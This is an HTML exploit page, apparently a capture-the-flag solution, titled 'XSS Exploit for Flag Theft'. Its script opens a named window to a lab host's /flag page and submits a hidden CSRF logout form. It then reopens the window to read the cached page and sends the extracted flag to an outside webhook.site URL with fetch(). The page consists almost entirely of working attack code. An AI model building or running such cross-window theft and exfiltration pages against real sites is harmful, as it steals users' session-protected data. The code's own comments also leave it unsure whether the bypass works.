<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit</title>
</head>
<body>
    <h1>XSS Exploit for Flag Theft</h1>
    <p>Using named window technique to steal the flag.</p>
    
    <script>
        // According to the technique described:
        // 1. Open named window BEFORE CSRF: w = window.open("http://web:11202/flag", "target")
        // 2. Execute CSRF (logout)
        // 3. Reopen the same named window: w = window.open("", "target")
        // 4. This allows us to bypass CORS and read the cached content
        
        // Step 1: Open named window to /flag BEFORE CSRF
        // This loads the flag page with bot's valid session
        var w = window.open('http://web:11202/flag', 'target');
        
        // Wait for the page to load completely
        setTimeout(function() {
            // Step 2: Execute CSRF - logout the bot
            // This invalidates the session cookie
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://web:11202/logout';
            form.style.display = 'none';
            document.body.appendChild(form);
            
            // Submit the form (this will logout the bot)
            form.submit();
            
            // Step 3: After CSRF, reopen the same named window with empty URL
            // According to the technique, this allows us to bypass CORS
            // because the window was opened before the CSRF
            setTimeout(function() {
                // Reopen the same named window
                w = window.open('', 'target');
                
                // Now try to read the flag content
                // The flag should still be accessible because it was cached
                setTimeout(function() {
                    try {
                        // Try to access the document
                        if (w && w.document) {
                            var flagCode = w.document.querySelector('pre code');
                            if (flagCode) {
                                var flag = flagCode.textContent;
                                // Send flag to our server
                                // Replace YOUR_SERVER with your actual server URL
                                fetch('https://webhook.site/8e7ccc1c-b998-40ff-bc7f-14c432def363?data=' + encodeURIComponent(flag))
                                    .then(() => console.log('Flag sent:', flag))
                                    .catch(e => console.error('Error sending flag:', e));
                            } else {
                                console.log('Flag element not found');
                                // Try to read the entire document body
                                console.log('Document body:', w.document.body ? w.document.body.innerHTML : 'No body');
                            }
                        } else {
                            console.log('Cannot access window document');
                        }
                    } catch (e) {
                        console.error('Error accessing flag window:', e);
                        // The error might be CORS, but we should still try
                    }
                }, 1000);
            }, 500);
        }, 2000);
    </script>
</body>
</html>
